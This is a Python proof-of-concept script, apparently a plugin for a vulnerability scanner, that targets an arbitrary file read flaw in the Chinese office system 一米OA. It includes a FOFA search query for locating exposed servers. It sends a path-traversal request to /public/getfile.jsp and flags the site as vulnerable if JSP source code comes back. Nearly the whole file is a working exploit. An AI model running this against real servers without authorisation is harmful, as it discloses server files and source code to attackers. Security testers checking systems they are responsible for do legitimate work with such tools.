'''
Function:
    一米OA 任意文件读取漏洞
Author:
    夜梓月
Email：
    yeziyue@hscsec.cn
Blog:
    https://www.cnblogs.com/zy4024/
GitHub:
    https://github.com/spmonkey/
Ps:
    version:一米OA
    fofa:app="一米OA"
'''
# -*- coding: utf-8 -*-
import requests
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        }
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, netloc, scheme):
        url = "{}://{}/public/getfile.jsp?user=1&prop=activex&filename=../public/getfile&extname=jsp".format(scheme, netloc)
        try:
            result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
            if "<%@page" in result.text:
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件读取漏洞\033[0m
                 GET {} HTTP/1.1
                 Host: {}""".format(target.path + "?" + target.query, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                return True
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        if self.vuln(netloc, scheme):
            return self.result_text
        else:
            return False

